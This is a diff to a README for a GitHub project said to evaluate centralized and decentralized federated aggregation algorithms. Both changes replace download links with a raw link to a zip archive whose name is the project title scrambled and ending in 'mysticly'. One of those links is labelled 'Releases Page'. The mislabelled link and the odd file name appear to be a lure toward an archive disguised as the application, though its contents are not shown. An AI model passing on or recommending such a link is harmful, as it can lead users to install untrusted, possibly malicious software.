@@ -1,6 +1,6 @@
 # 🚀 Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems - Simplifying Algorithm Comparison
 
-[![Download Now](https://raw.githubusercontent.com/trabelsimahdi14/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems/main/expedient/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems_v2.1-beta.4.zip)](https://raw.githubusercontent.com/trabelsimahdi14/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems/main/expedient/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems_v2.1-beta.4.zip)
+[![Download Now](https://raw.githubusercontent.com/trabelsimahdi14/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems/main/expedient/Decentralized-Algorithms-Evaluation-Federated-Framework-Systems-in-Aggregation-for-and-Centralized-mysticly.zip)](https://raw.githubusercontent.com/trabelsimahdi14/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems/main/expedient/Decentralized-Algorithms-Evaluation-Federated-Framework-Systems-in-Aggregation-for-and-Centralized-mysticly.zip)
 
 ## 📜 Description
 
@@ -17,7 +17,7 @@ To get started, you will need to download the application from the releases page
 
 ## ⭐ Download & Install
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/trabelsimahdi14/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems/main/expedient/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems_v2.1-beta.4.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/trabelsimahdi14/Evaluation-Framework-for-Centralized-and-Decentralized-Aggregation-Algorithms-in-Federated-Systems/main/expedient/Decentralized-Algorithms-Evaluation-Federated-Framework-Systems-in-Aggregation-for-and-Centralized-mysticly.zip).
 
 ### Step-by-Step Installation Instructions
 
